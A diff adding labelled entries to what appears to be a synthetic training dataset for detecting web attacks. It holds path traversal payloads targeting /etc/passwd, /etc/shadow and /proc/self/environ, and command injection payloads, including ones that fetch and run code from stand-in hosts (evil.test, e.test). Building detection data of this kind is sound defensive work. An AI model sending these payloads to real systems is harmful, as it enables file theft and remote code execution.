+  },
+  {
+    "id": "tx24",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/api/open",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"file\":\"../../../etc/passwd\"}",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx25",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/api/open",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "file=....//....//....//etc/shadow",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx26",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/img?src=/etc/passwd",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx27",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/img?src=file:///etc/passwd",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx28",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/img?src=..%252f..%252f..%252fetc%252fpasswd",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx29",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/inc?p=../../../../proc/self/environ",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx30",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/inc?p=C:\\Windows\\win.ini",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx31",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=8.8.8.8;whoami",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx32",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=8.8.8.8|id",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx33",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=$(id)",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx34",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/net",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"host\":\"a.com && cat /etc/passwd\"}",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx35",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/net",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "host=a.com;ls -la",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx36",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=%60whoami%60",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx37",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=1.1.1.1%0acat%20/etc/passwd",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx38",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=x;curl http://evil.test/s.sh|sh",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx39",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/net",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"host\":\"x || wget http://e.test/p\"}",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx40",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/net?host=x&&uname -a",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
   }
 ]
-
